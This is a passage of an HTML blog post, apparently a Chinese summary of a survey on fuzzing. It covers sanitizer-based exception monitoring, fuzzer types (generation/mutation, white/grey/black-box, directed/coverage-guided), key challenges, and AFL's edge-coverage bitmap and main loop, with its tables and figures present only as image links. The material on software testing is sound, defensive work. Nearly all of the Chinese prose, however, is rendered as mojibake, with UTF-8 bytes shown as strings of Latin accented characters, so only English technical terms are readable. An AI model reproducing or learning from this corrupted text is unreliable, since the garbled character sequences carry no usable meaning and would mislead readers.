<p>Fuzzer åœ¨ç›®æ ‡ç¨‹åºæ‰§è¡ŒæœŸé—´ç›‘è§†æ‰§è¡ŒçŠ¶æ€ï¼ŒæœŸæœ›å‡ºç°å¼‚å¸¸å’Œå´©æºƒã€‚å¸¸ç”¨çš„å¼‚å¸¸ç›‘è§†æ–¹æ³•åŒ…æ‹¬ç›‘è§†ç‰¹å®šçš„ç³»ç»Ÿä¿¡å·ã€å´©æºƒå’Œå…¶ä»–è¡Œä¸ºã€‚å¯¹äºæ²¡æœ‰ç›´è§‚è¡¨ç°çš„å¼‚å¸¸ï¼Œå¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹å·¥å…·ï¼ŒåŒ…æ‹¬ AddressSanitizerï¼ŒDataflowSanitizerï¼ŒThreadSanitizerï¼ŒLeakSanitizer ç­‰ã€‚å½“å¼‚å¸¸è¢«æ•è·æ—¶ï¼Œfuzzer ä¼šå­˜å‚¨ç›¸åº”çš„æµ‹è¯•ç”¨ä¾‹ä»¥ä¾›å›æ”¾å’Œåˆ†æã€‚</p>
<p>åœ¨åˆ†æé˜¶æ®µï¼Œåˆ†æäººå‘˜è¯•å›¾ç¡®å®šæ•è·çš„å¼‚å¸¸çš„ä½ç½®å’ŒåŸå› ã€‚åˆ†æé€šå¸¸åœ¨è°ƒè¯•ç¨‹åºçš„å¸®åŠ©ä¸‹è¿›è¡Œï¼Œå¦‚gdbã€windbgæˆ–å…¶ä»–äºŒè¿›åˆ¶åˆ†æå·¥å…·ï¼Œå¦‚ida proã€ollydbgç­‰ã€‚äºŒè¿›åˆ¶æ£€æµ‹å·¥å…·ï¼Œå¦‚ Pinã€‚è‡ªåŠ¨å´©æºƒåˆ†ææ˜¯å¦ä¸€ä¸ªé‡è¦çš„ç ”ç©¶é¢†åŸŸã€‚</p>
<p><strong>Fuzzer çš„ç±»å‹</strong><br>Fuzzer å¯ä»¥åˆ†ä¸ºåŸºäºç”Ÿæˆå’ŒåŸºäºçªå˜ä¸¤ç§ã€‚å¯¹äºåŸºäºç”Ÿæˆçš„ fuzzerï¼Œéœ€è¦äº†è§£ç¨‹åºçš„æ„æˆ(çŸ¥è¯†)ã€‚ä¾‹å¦‚å¯¹äºæ–‡ä»¶æ ¼å¼ fuzzï¼Œé€šå¸¸æä¾›é¢„å…ˆå®šä¹‰æ–‡ä»¶æ ¼å¼çš„é…ç½®æ–‡ä»¶ã€‚æ ¹æ®é…ç½®æ–‡ä»¶ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ã€‚è¿™äº›æµ‹è¯•ç”¨ä¾‹ç”±äºæœ‰é…ç½®æ–‡ä»¶çš„çº¦æŸï¼Œèƒ½å¤Ÿæ›´å®¹æ˜“åœ°é€šè¿‡ç¨‹åºéªŒè¯ï¼Œæ›´æœ‰å¯èƒ½æµ‹è¯•ç›®æ ‡ç¨‹åºçš„æ·±å±‚ä»£ç ã€‚ç„¶è€Œï¼Œåœ¨æ²¡æœ‰å¯ç”¨çš„é…ç½®æ–‡ä»¶ã€è¯´æ˜æ–‡æ¡£æƒ…å†µä¸‹ï¼Œåˆ†æå¾…æµ‹ç¨‹åºçš„æµ‹è¯•ç”¨ä¾‹æ ¼å¼æ˜¯ä¸€é¡¹è‰°å·¨çš„å·¥ä½œã€‚å› æ­¤ï¼ŒåŸºäºçªå˜çš„ fuzzer è¢«æ›´ä¸ºå¹¿æ³›çš„é‡‡ç”¨ã€‚</p>
<p>å¯¹äºåŸºäºçªå˜çš„ fuzzer æ¥è¯´ï¼Œåˆå§‹æ¡ä»¶ä¸‹éœ€è¦ä¸€ç»„æœ‰æ•ˆçš„è¾“å…¥ã€‚æµ‹è¯•ç”¨ä¾‹æ˜¯é€šè¿‡åˆå§‹è¾“å…¥å’Œ fuzz è¿‡ç¨‹ä¸­ç”Ÿæˆçš„æµ‹è¯•ç”¨ä¾‹çš„å˜å¼‚è€Œç”Ÿæˆçš„ã€‚æˆ‘ä»¬åœ¨è¡¨2ä¸­æ¯”è¾ƒäº†åŸºäºç”Ÿæˆçš„ fuzzer å’ŒåŸºäºå˜å¼‚çš„ fuzzer ã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey4.png"
                     
                ><br>æ ¹æ®å¯¹ç¨‹åºæºä»£ç çš„ä¾èµ–æ€§å’Œç¨‹åºåˆ†æçš„ç¨‹åº¦ï¼Œfuzzer å¯ä»¥åˆ†ä¸ºç™½ç›’ã€ç°ç›’å’Œé»‘ç›’ã€‚åŸºäºç™½ç›’çš„ fuzzer å¯ä»¥è®¿é—®ç¨‹åºçš„æºä»£ç ï¼Œå› æ­¤å¯é€šè¿‡åˆ†ææºä»£ç ä»¥åŠæµ‹è¯•ç”¨ä¾‹å¦‚ä½•å½±å“ç¨‹åºçš„è¿è¡ŒçŠ¶æ€æ¥æ”¶é›†æ›´å¤šçš„ä¿¡æ¯ã€‚é»‘ç›’ fuzzer åœ¨ä¸äº†è§£ç›®æ ‡ç¨‹åºå†…éƒ¨ç»“æ„çš„æƒ…å†µä¸‹è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚ç°ç›’ fuzzer ä¹Ÿä¸éœ€è¦æºä»£ç ï¼Œé€šè¿‡ç¨‹åºåˆ†æè·å¾—ç›®æ ‡ç¨‹åºçš„å†…éƒ¨ä¿¡æ¯ã€‚æˆ‘ä»¬åœ¨è¡¨3ä¸­åˆ—å‡ºäº†ä¸€äº›å¸¸è§çš„ç™½ç›’ã€ç°ç›’å’Œé»‘ç›’ fuzzerã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey3.png"
                     
                ></p>
<p>æ ¹æ®å¼€å‘çš„ç­–ç•¥ï¼Œè¿˜å¯ä»¥å°† fuzzer åˆ†ä¸ºå®šå‘ fuzzer å’ŒåŸºäºè¦†ç›–çš„ fuzzerã€‚å®šå‘ fuzzer çš„ç›®æ ‡æ˜¯ç”Ÿæˆè¦†ç›–ç¨‹åºç›®æ ‡ä»£ç å’Œç›®æ ‡è·¯å¾„çš„æµ‹è¯•ç”¨ä¾‹ï¼Œè€ŒåŸºäºè¦†ç›–çš„ fuzzer çš„ç›®æ ‡æ˜¯ç”Ÿæˆè¦†ç›–å°½å¯èƒ½å¤šçš„ç¨‹åºä»£ç çš„æµ‹è¯•ç”¨ä¾‹ã€‚å®šå‘ fuzzer ç›®çš„æ˜¯å¯¹ç¨‹åºè¿›è¡Œæ›´å¿«çš„æµ‹è¯•ï¼Œè€ŒåŸºäºè¦†ç›–çš„ fuzzer ç›®çš„æ˜¯è¿›è¡Œæ›´å½»åº•çš„æµ‹è¯•ï¼Œå¹¶å°½å¯èƒ½åœ°æ£€æµ‹å‡ºæ›´å¤šçš„é”™è¯¯ã€‚æ— è®ºæ˜¯å®šå‘ fuzzer è¿˜æ˜¯åŸºäºè¦†ç›–çš„fuzzerï¼Œå¦‚ä½•æå–æ‰§è¡Œè·¯å¾„ä¿¡æ¯æ˜¯å…³é”®é—®é¢˜ã€‚</p>
<p>æ ¹æ®å¯¹ç¨‹åºæ‰§è¡ŒçŠ¶æ€çš„ç›‘æ§ä¸æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆä¹‹é—´æ˜¯å¦å­˜åœ¨åé¦ˆï¼Œfuzzer å¯ä»¥åˆ†ä¸ºç¡¬æ ¸ fuzzer å’Œæ™ºèƒ½ fuzzerã€‚æ™ºèƒ½ fuzzer æ ¹æ®æ”¶é›†åˆ°çš„æµ‹è¯•ç”¨ä¾‹å¦‚ä½•å½±å“ç¨‹åºè¡Œä¸ºçš„ä¿¡æ¯æ¥è°ƒæ•´æµ‹è¯•ç”¨ä¾‹çš„ç”Ÿæˆã€‚å¯¹äºåŸºäºå˜å¼‚çš„ fuzzerï¼Œåé¦ˆä¿¡æ¯å¯ä»¥ç”¨æ¥ç¡®å®šæµ‹è¯•ç”¨ä¾‹çš„å“ªä¸€éƒ¨åˆ†åº”è¯¥è¢«å˜å¼‚ä»¥åŠå˜å¼‚å®ƒä»¬çš„æ–¹å¼ã€‚ç¡¬æ ¸ fuzzer å…·æœ‰æ›´å¥½çš„æµ‹è¯•é€Ÿåº¦ï¼Œè€Œæ™ºèƒ½ fuzzer å¯ä»¥ç”Ÿæˆæ›´å¥½çš„æµ‹è¯•ç”¨ä¾‹å¹¶è·å¾—æ›´å¥½çš„æ•ˆç‡ã€‚</p>
<p><strong>Fuzz ä¸­çš„å…³é”®é—®é¢˜</strong><br>ä¼ ç»Ÿçš„ fuzz ç®—æ³•åœ¨å®é™…åº”ç”¨ä¸­é€šå¸¸é‡‡ç”¨åŸºäºéšæœºçš„ fuzz ç­–ç•¥ã€‚ç”±äºç¨‹åºåˆ†ææŠ€æœ¯çš„å±€é™ï¼Œå¯¼è‡´ fuzzer ä¸å¤Ÿæ™ºèƒ½ã€‚å› æ­¤æ¨¡ç³Šæµ‹è¯•ä»ç„¶é¢ä¸´è®¸å¤šæŒ‘æˆ˜ã€‚æˆ‘ä»¬åˆ—å‡ºä¸€äº›å…³é”®é—®é¢˜å¦‚ä¸‹ã€‚</p>
<p>å¦‚ä½•å˜å¼‚ç§å­è¾“å…¥ï¼ŸåŸºäºå˜å¼‚çš„ç”Ÿæˆç­–ç•¥ä»¥å…¶æ–¹ä¾¿ã€æ˜“è®¾ç½®ç­‰ä¼˜ç‚¹è¢«ç°ä»£ fuzzer å¹¿æ³›åº”ç”¨ã€‚ç„¶è€Œï¼Œå¦‚ä½•å˜å¼‚å’Œç”Ÿæˆèƒ½å¤Ÿè¦†ç›–æ›´å¤šç¨‹åºè·¯å¾„å’Œæ›´å®¹æ˜“è§¦å‘é”™è¯¯çš„æµ‹è¯•ç”¨ä¾‹æ˜¯ä¸€ä¸ªå…³é”®é—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼ŒåŸºäºå˜å¼‚çš„ fuzzer åœ¨è¿›è¡Œå˜å¼‚æ—¶éœ€è¦å›ç­”ä¸¤ä¸ªé—®é¢˜ï¼š<br>ï¼ˆ1ï¼‰åœ¨å“ªé‡Œå˜å¼‚ï¼Ÿ<br>ï¼ˆ2ï¼‰å¦‚ä½•å˜å¼‚ï¼Ÿ<br>åªæœ‰å‡ ä¸ªå…³é”®ä½ç½®ä¸Šçš„å˜åŒ–æ‰ä¼šå½±å“ç¨‹åºçš„æ§åˆ¶æµã€‚å› æ­¤ï¼Œå¦‚ä½•åœ¨æµ‹è¯•ç”¨ä¾‹ä¸­å®šä½è¿™äº›å…³é”®ä½ç½®æ˜¯éå¸¸é‡è¦çš„ã€‚æ­¤å¤–ï¼Œfuzzer åœ¨å…³é”®ä½ç½®ä¸Šå¦‚ä½•å˜å¼‚æ˜¯å¦ä¸€ä¸ªå…³é”®é—®é¢˜ï¼Œå³å¦‚ä½•ç¡®å®šå¯ä»¥å¼•å¯¼ç¨‹åºåˆ°è¾¾è„†å¼±è·¯å¾„çš„å€¼ã€‚æ€»ä¹‹ï¼Œæµ‹è¯•ç”¨ä¾‹çš„ç›²ç›®å˜å¼‚å¯¼è‡´æµ‹è¯•èµ„æºçš„ä¸¥é‡æµªè´¹ï¼Œæ›´å¥½çš„å˜å¼‚ç­–ç•¥å¯ä»¥æ˜¾è‘—æé«˜ fuzz çš„æ•ˆç‡ã€‚</p>
<p>ä½ä»£ç è¦†ç›–ç‡çš„é—®é¢˜ï¼Ÿä»£ç è¦†ç›–ç‡è¶Šé«˜è¡¨ç¤ºç¨‹åºæ‰§è¡ŒçŠ¶æ€çš„è¦†ç›–ç‡è¶Šé«˜ï¼Œæµ‹è¯•ä¹Ÿè¶Šå½»åº•ã€‚ä»¥å‰çš„å·¥ä½œå·²ç»è¯æ˜ï¼Œæ›´é«˜çš„è¦†ç›–ç‡ä¼šå¾—åˆ°æ›´é«˜çš„æ‰¾åˆ°é”™è¯¯çš„æ¦‚ç‡ã€‚ç„¶è€Œï¼Œå¤§å¤šæ•°æµ‹è¯•ç”¨ä¾‹åªè¦†ç›–å°‘æ•°è·¯å¾„ï¼Œè€Œå¤šæ•°ä»£ç æ— æ³•è®¿é—®ã€‚å› æ­¤ï¼Œä»…ä»…é€šè¿‡å¤§é‡çš„æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆå’ŒæŠ•å…¥æµ‹è¯•èµ„æºæ¥å®ç°é«˜è¦†ç›–ç‡å¹¶ä¸æ˜¯ä¸€ä¸ªæ˜æ™ºçš„é€‰æ‹©ã€‚åŸºäºè¦†ç›–çš„ fuzzer è¯•å›¾å€ŸåŠ©ç¨‹åºåˆ†ææŠ€æœ¯ï¼ˆå¦‚ç¨‹åºæ’è£…ï¼‰æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬å°†åœ¨ä¸‹ä¸€èŠ‚ä»‹ç»ç»†èŠ‚ã€‚</p>
<p>é€šè¿‡éªŒè¯çš„é—®é¢˜ï¼Ÿç¨‹åºé€šå¸¸åœ¨è§£æå’Œå¤„ç†æ•°æ®ä¹‹å‰éªŒè¯ã€‚éªŒè¯èµ·åˆ°ä¿æŠ¤ç¨‹åºçš„ä½œç”¨ï¼ŒèŠ‚çœäº†è®¡ç®—èµ„æºï¼Œä¿æŠ¤ç¨‹åºå…å—æ— æ•ˆè¾“å…¥å’Œæ¶æ„æ„é€ çš„è¾“å…¥é€ æˆæŸåã€‚æ— æ•ˆçš„æµ‹è¯•ç”¨ä¾‹æ€»æ˜¯è¢«å¿½ç•¥æˆ–ä¸¢å¼ƒã€‚<br>å¹»æ•°ã€ç‰¹å®šçš„å­—ç¬¦ä¸²ã€ç‰ˆæœ¬å·æ£€æŸ¥å’Œæ ¡éªŒå’Œæ˜¯ç¨‹åºä¸­å¸¸ç”¨çš„éªŒè¯æ–¹æ³•ã€‚ç”±é»‘ç›’å’Œç°ç›’ fuzzer ç”Ÿæˆçš„æµ‹è¯•ç”¨ä¾‹å¾ˆéš¾é€šè¿‡è¿™äº›éªŒè¯ï¼Œå¯¼è‡´ fuzz æ•ˆç‡å¾ˆä½ã€‚å› æ­¤ï¼Œå¦‚ä½•é€šè¿‡éªŒè¯æ˜¯å¦ä¸€ä¸ªå…³é”®æŒ‘æˆ˜ã€‚</p>
<p>ä¸ºäº†åº”å¯¹è¿™äº›é—®é¢˜ï¼Œäººä»¬æå‡ºäº†å„ç§æ–¹æ³•ï¼Œæ—¢æœ‰ä¼ ç»Ÿçš„æŠ€æœ¯ï¼Œå¦‚ç¨‹åºæ£€æµ‹å’Œæ±¡æŸ“åˆ†æï¼Œä¹Ÿæœ‰æ–°çš„æŠ€æœ¯ï¼Œå¦‚ RNN å’ŒLSTMã€‚è¿™äº›æŠ€æœ¯çš„åŸç†å°†åœ¨â€œæŠ€æœ¯èåˆâ€ä¸€èŠ‚ä¸­è®¨è®ºã€‚</p>
<p><strong>åŸºäºè¦†ç›–ç‡çš„æ¨¡ç³Šæµ‹è¯•</strong></p>
<p>åŸºäºè¦†ç›–çš„ fuzz ç­–ç•¥è¢«ç°ä»£ fuzzer å¹¿æ³›åº”ç”¨ï¼Œå¹¶è¢«è¯æ˜æ˜¯éå¸¸æœ‰æ•ˆçš„ã€‚ä¸ºäº†å®ç°ä¸€ä¸ªæ·±å…¥è€Œå½»åº•çš„ fuzz è¿‡ç¨‹ï¼Œfuzzer åº”è¯¥å°è¯•éå†å°½å¯èƒ½å¤šçš„ç¨‹åºè¿è¡ŒçŠ¶æ€ã€‚ç„¶è€Œï¼Œç”±äºç¨‹åºè¡Œä¸ºçš„ä¸ç¡®å®šæ€§ï¼Œç¨‹åºçŠ¶æ€ä¸å­˜åœ¨ç®€å•çš„åº¦é‡æ ‡å‡†ã€‚æ­¤å¤–ï¼Œä¸€ä¸ªå¥½çš„åº¦é‡æ ‡å‡†åº”è¯¥åœ¨è¿›ç¨‹è¿è¡ŒæœŸé—´å®¹æ˜“è¢«ç¡®å®šã€‚å› æ­¤ï¼Œä»£ç è¦†ç›–ç‡æˆä¸ºè¿‘ä¼¼çš„åº¦é‡æ–¹æ¡ˆã€‚ä½¿ç”¨è¿™ç§æ–¹æ¡ˆï¼Œä»£ç è¦†ç›–ç‡çš„å¢åŠ è¡¨ç¤ºç¨‹åºè¿›å…¥æ–°çš„çŠ¶æ€ã€‚æ­¤å¤–ï¼Œé€šè¿‡ç¼–è¯‘å†…éƒ¨å’Œå¤–éƒ¨å·¥å…·ï¼Œä»£ç è¦†ç›–ç‡å¯ä»¥å¾ˆå®¹æ˜“åœ°æµ‹é‡ã€‚æˆ‘ä»¬è®¤ä¸ºä»£ç è¦†ç›–æ˜¯ä¸€ç§è¿‘ä¼¼çš„åº¦é‡æ ‡å‡†ï¼Œå› ä¸ºåœ¨å®è·µä¸­ï¼Œä¸€ä¸ªå›ºå®šçš„ä»£ç è¦†ç›–ç‡å¹¶ä¸è¡¨ç¤ºä¸€ä¸ªè¿ç»­çš„ç¨‹åºçŠ¶æ€ã€‚ä½¿ç”¨æ­¤åº¦é‡æ ‡å‡†å¯èƒ½ä¼šå¯¼è‡´æŸäº›ä¿¡æ¯ä¸¢å¤±ã€‚åœ¨è¿™ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬ä»¥ afl ä¸ºä¾‹è¯´æ˜ã€‚</p>
<p><strong>ä»£ç è¦†ç›–ç‡æµ‹é‡</strong><br>åœ¨ç¨‹åºåˆ†æä¸­ï¼Œç¨‹åºç”±åŸºæœ¬å—ç»„æˆã€‚åŸºæœ¬å—æ˜¯å…·æœ‰å•ä¸ªå…¥å£å’Œå‡ºå£ç‚¹çš„ä»£ç æ®µï¼ŒåŸºæœ¬å—ä¸­çš„æŒ‡ä»¤å°†è¢«é¡ºåºæ‰§è¡Œï¼Œå¹¶ä¸”åªæ‰§è¡Œä¸€æ¬¡ã€‚åœ¨ä»£ç è¦†ç›–ç‡æµ‹é‡ä¸­ï¼Œæœ€æ–°çš„æ–¹æ³•æ˜¯ä»¥åŸºæœ¬å—ä½œä¸ºæœ€ä½³ç²’åº¦ã€‚å…¶åŸå› åŒ…æ‹¬ï¼š<br>ï¼ˆ1ï¼‰åŸºæœ¬å—æ˜¯ç¨‹åºæ‰§è¡Œçš„æœ€å°ç›¸å¹²å•å…ƒï¼›<br>ï¼ˆ2ï¼‰æµ‹é‡å‡½æ•°æˆ–æŒ‡ä»¤ä¼šå¯¼è‡´ä¿¡æ¯ä¸¢å¤±æˆ–å†—ä½™ï¼›<br>ï¼ˆ3ï¼‰åŸºæœ¬å—å¯ä»¥é€šè¿‡ç¬¬ä¸€æ¡æŒ‡ä»¤çš„åœ°å€æ¥è¯†åˆ«ï¼Œå¹¶ä¸”åŸºæœ¬å—ä¿¡æ¯å¯ä»¥é€šè¿‡ä»£ç æ£€æµ‹æ¥è½»æ¾æå–ã€‚<br>ç›®å‰ï¼Œæœ‰ä¸¤ç§åŸºäºåŸºæœ¬å—çš„æµ‹é‡æ–¹æ³•ï¼Œç»Ÿè®¡è¢«æ‰§è¡Œçš„åŸºæœ¬å—æ•°é‡ã€ç»Ÿè®¡åŸºæœ¬å—ä¹‹é—´è½¬æ¢çš„æ¬¡æ•°ã€‚åœ¨åä¸€ç§æ–¹æ³•ä¸­ï¼Œç¨‹åºè¢«è§£é‡Šä¸ºä¸€ä¸ªå›¾ï¼ŒèŠ‚ç‚¹è¢«ç”¨æ¥è¡¨ç¤ºåŸºæœ¬å—ï¼Œè¾¹è¢«ç”¨æ¥è¡¨ç¤ºåŸºæœ¬å—ä¹‹é—´çš„è½¬æ¢ã€‚å®éªŒè¡¨æ˜ï¼Œç®€å•åœ°è®¡ç®—å·²æ‰§è¡Œçš„åŸºæœ¬å—å°†å¯¼è‡´ä¸¥é‡çš„ä¿¡æ¯ä¸¢å¤±ã€‚å¦‚å›¾2æ‰€ç¤ºï¼Œå¦‚æœé¦–å…ˆæ‰§è¡Œç¨‹åºè·¯å¾„ï¼ˆbb1ã€bb2ã€bb3ã€bb4ï¼‰ï¼Œç„¶åæ‰§è¡Œè·¯å¾„ï¼ˆbb1ã€bb2ã€bb4ï¼‰ï¼Œåˆ™ä¸¢å¤±æ–°è¾¹ï¼ˆbb2ã€bb4ï¼‰ä¿¡æ¯ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey5.png"
                     
                ></p>
<p>AFL ç¬¬ä¸€æ¬¡å°†è¾¹(edge)æµ‹é‡æ–¹æ³•å¼•å…¥åˆ°åŸºäºè¦†ç›–çš„ fuzz ä¸­ã€‚ä»¥ afl ä¸ºä¾‹è¯´æ˜åŸºäºè¦†ç›–çš„ fuzzer åœ¨æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­å¦‚ä½•è·å–ä»£ç è¦†ç›–ç‡ä¿¡æ¯ã€‚<br>aflé€šè¿‡è½»é‡çº§ç¨‹åºæ’æ¡©è·å¾—ä»£ç è¦†ç›–ç‡ä¿¡æ¯ã€‚æ ¹æ®æ˜¯å¦æä¾›æºä»£ç ï¼Œaflæä¾›äº†ä¸¤ç§æ’è£…æ¨¡å¼ï¼šç¼–è¯‘æ’è£…å’Œå¤–éƒ¨æ’è£…ã€‚æ ¹æ®æˆ‘ä»¬ä½¿ç”¨çš„ç¼–è¯‘å™¨ï¼Œåœ¨ç¼–è¯‘æ’æ¡©æ¨¡å¼ä¸‹ç¼–è¯‘æ—¶ï¼ŒaflåŒæ—¶æä¾›gccå’Œllvmæ”¯æŒï¼Œè¿™å°†åœ¨ç”ŸæˆäºŒè¿›åˆ¶æ–‡ä»¶æ—¶æ’å…¥æ£€æµ‹ä»£ç ç‰‡æ®µã€‚<br>åœ¨å¤–éƒ¨æ¨¡å¼ä¸‹ï¼Œaflæä¾›qemuæ¨¡å¼ï¼Œå½“åŸºæœ¬å—è½¬æ¢ä¸ºtcgå—æ—¶å°†æ£€æµ‹ä»£ç ç‰‡æ®µã€‚</p>
<p>ç‰‡æ®µ 1 æ˜¾ç¤ºäº†æ’å…¥æŒ‡ä»¤çš„ä»£ç ç‰‡æ®µçš„ä¼ªä»£ç ã€‚åœ¨æŒ‡ä»¤æ’å…¥æŠ€æœ¯ä¸­ï¼Œä¸€ä¸ªéšæœº IDï¼Œå³å˜é‡ cur_location è¢«æ’å…¥åˆ°åŸºæœ¬å—ä¸­ã€‚å˜é‡ shared_mem æ•°ç»„æ˜¯ä¸€ä¸ª64 KBçš„å…±äº«å†…å­˜åŒºåŸŸï¼Œå…¶ä¸­æ¯ä¸ªå­—èŠ‚éƒ½æ˜ å°„åˆ°ä¸€ä¸ªç‰¹å®šè¾¹çš„å‘½ä¸­ï¼ˆbb_srcï¼Œbb_dstï¼‰ä¾‹å¦‚(BB2, BB4)ã€‚å½“åŸºæœ¬å—è½¬æ¢å‘ç”Ÿæ—¶ï¼Œå°†è®¡ç®—å“ˆå¸Œå€¼ï¼Œå¹¶æ›´æ–°æ•°ç»„ä¸­ç›¸åº”çš„å­—èŠ‚å€¼ã€‚å›¾3æè¿°äº†æ•£åˆ—å’Œä½å›¾çš„æ˜ å°„ã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey6.png"
                     
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey7.png"
                     
                ><br><strong>åŸºäºè¦†ç›–ç‡çš„ fuzz æµç¨‹</strong></p>
<p>ç®—æ³•1ç»™å‡ºäº†åŸºäºè¦†ç›–çš„ fuzzer çš„ä¸€èˆ¬å·¥ä½œè¿‡ç¨‹ã€‚æµ‹è¯•ä»åˆå§‹ç»™å®šçš„ç§å­è¾“å…¥å¼€å§‹ã€‚å¦‚æœç§å­è¾“å…¥é›†æ²¡æœ‰ç»™å®šï¼Œé‚£ä¹ˆfuzzerè‡ªå·±æ„é€ ä¸€ä¸ªã€‚åœ¨ä¸»å¾ªç¯ä¸­ï¼Œfuzzer åå¤é€‰æ‹©ä¸€ä¸ªç§å­ç”¨äºåç»­çš„å˜å¼‚å’Œæµ‹è¯•ç”¨ä¾‹ç”Ÿæˆã€‚ç„¶åé©±åŠ¨ç›®æ ‡ç¨‹åºåœ¨fuzzerçš„ç›‘æ§ä¸‹æ‰§è¡Œç”Ÿæˆçš„æµ‹è¯•ç”¨ä¾‹ã€‚æ”¶é›†è§¦å‘å´©æºƒçš„æµ‹è¯•ç”¨ä¾‹ï¼Œå¹¶å°†å…¶ä»–æœ‰è¶£çš„ç”¨ä¾‹æ·»åŠ åˆ°ç§å­æ± ä¸­ã€‚å¯¹äºåŸºäºè¦†ç›–çš„ fuzzerï¼Œèƒ½å¤Ÿè§¦å‘æ–°æ§åˆ¶æµçš„æµ‹è¯•ç”¨ä¾‹è¢«è®¤ä¸ºæ˜¯æœ‰è¶£çš„ã€‚ä¸»å¾ªç¯åœ¨é¢„å…ˆé…ç½®çš„è¶…æ—¶æˆ–ä¸­æ­¢ä¿¡å·æ—¶åœæ­¢ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey8.png"
                     
                ></p>
<p>åœ¨ fuzz è¿‡ç¨‹ä¸­ï¼Œfuzzer é€šè¿‡å„ç§æ–¹æ³•è·Ÿè¸ªæ‰§è¡Œã€‚åŸºæœ¬ä¸Šï¼Œfuzzer è·Ÿè¸ªæ‰§è¡Œæœ‰ä¸¤ä¸ªç›®çš„ï¼Œä»£ç è¦†ç›–ç‡å’Œå¼‚å¸¸æ•è·ã€‚ä»£ç è¦†ç›–ç‡ä¿¡æ¯ç”¨äºè¿›è¡Œå½»åº•çš„ç¨‹åºçŠ¶æ€æ¢ç´¢ï¼Œè€Œå¼‚å¸¸è·Ÿè¸ªæ˜¯ä¸ºäº†æ›´å¥½åœ°å‘ç°é”™è¯¯ã€‚å¦‚å‰ä¸€å°èŠ‚æ‰€è¿°ï¼Œaflé€šè¿‡ä»£ç æ’æ¡©å’Œaflä½å›¾è·Ÿè¸ªä»£ç è¦†ç›–ç‡ã€‚<br>å›¾4æ˜¾ç¤ºäº†AFLçš„å·¥ä½œè¿‡ç¨‹ï¼ŒAFLæ˜¯ä¸€ç§éå¸¸æœ‰ä»£è¡¨æ€§çš„åŸºäºè¦†ç›–ç‡çš„ fuzzer ã€‚ç›®æ ‡åº”ç”¨ç¨‹åºæ‰§è¡Œå‰è¢«æ’æ¡©ã€‚å¦‚å‰æ‰€è¿°ï¼Œaflæ”¯æŒç¼–è¯‘æ—¶æ’æ¡©å’Œå¤–éƒ¨æ’æ¡©ï¼Œä½¿ç”¨gcc&#x2F;llvmæ¨¡å¼å’Œqemuæ¨¡å¼ã€‚è¿˜åº”æä¾›åˆå§‹ç§å­è¾“å…¥ã€‚åœ¨ä¸»å¾ªç¯ä¸­ï¼Œ<br>ï¼ˆ1ï¼‰fuzzer æ ¹æ®ç§å­é€‰æ‹©ç­–ç•¥ä»ç§å­æ± ä¸­é€‰æ‹©æœ€åˆé€‚çš„ç§å­ï¼Œaflé€‰æ‹©æœ€å¿«å’Œæœ€å°çš„ç§å­ã€‚<br>ï¼ˆ2ï¼‰æ ¹æ®å˜å¼‚ç­–ç•¥å¯¹ç§å­æ–‡ä»¶è¿›è¡Œå˜å¼‚ï¼Œç”Ÿæˆä¸€æ‰¹æµ‹è¯•ç”¨ä¾‹ã€‚AFLç›®å‰é‡‡ç”¨äº†ä¸€äº›éšæœºä¿®æ”¹å’Œæµ‹è¯•ç”¨ä¾‹æ‹¼æ¥çš„æ–¹æ³•ï¼ŒåŒ…æ‹¬å¯å˜é•¿åº¦å’Œæ­¥é•¿çš„é¡ºåºä½ç¿»è½¬ã€å°æ•´æ•°çš„é¡ºåºåŠ å‡å’Œå·²çŸ¥æœ‰è¶£æ•´æ•°çš„é¡ºåºæ’å…¥ï¼Œå¦‚0ï¼Œ1ï¼Œint_maxï¼Œetc.<br>ï¼ˆ3ï¼‰æµ‹è¯•ç”¨ä¾‹æ”¾å…¥ç¨‹åºï¼Œfuzzer è·Ÿè¸ªæ‰§è¡Œè¿‡ç¨‹ã€‚æ”¶é›†è¦†ç›–ç‡ä¿¡æ¯ä»¥ç¡®å®šæœ‰è¶£çš„æµ‹è¯•ç”¨ä¾‹ï¼Œå³åˆ°è¾¾æ–°æ§åˆ¶æµçš„æµ‹è¯•ç”¨ä¾‹ã€‚æœ‰è¶£çš„æµ‹è¯•ç”¨ä¾‹è¢«æ·»åŠ åˆ°ç§å­æ± ä¸­ï¼Œä»¥ä¾›ä¸‹ä¸€è½®è¿è¡Œã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey9.png"
                     
                ></p>
<p><strong>å…³é”®é—®é¢˜</strong><br>å‰é¢çš„ä»‹ç»è¡¨æ˜ï¼Œè¦è¿è¡Œä¸€ä¸ªé«˜æ•ˆçš„åŸºäºè¦†ç›–ç‡çš„ fuzzer éœ€è¦è§£å†³å¾ˆå¤šé—®é¢˜ã€‚å›´ç»•è¿™äº›é—®é¢˜è¿›è¡Œäº†è®¸å¤šæ¢ç´¢ã€‚æˆ‘ä»¬åœ¨æœ¬å°èŠ‚ä¸­æ€»ç»“å¹¶åˆ—ä¸¾ä¸€äº›æœ€æ–°çš„å·¥ä½œæˆæœï¼Œå¦‚è¡¨4æ‰€ç¤ºã€‚<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/fuzzing_a_survey10.png"
                     
